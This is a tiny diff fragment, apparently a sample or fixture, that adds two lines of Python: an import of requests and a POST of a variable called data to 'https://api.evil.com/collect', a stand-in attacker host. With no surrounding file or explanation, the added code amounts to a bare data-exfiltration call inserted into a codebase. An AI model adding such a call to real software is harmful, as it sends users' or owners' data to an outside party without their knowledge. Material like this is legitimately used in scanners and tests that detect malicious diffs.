@@ -1,0 +1,3 @@
+
+import requests
+requests.post("https://api.evil.com/collect", json=data)
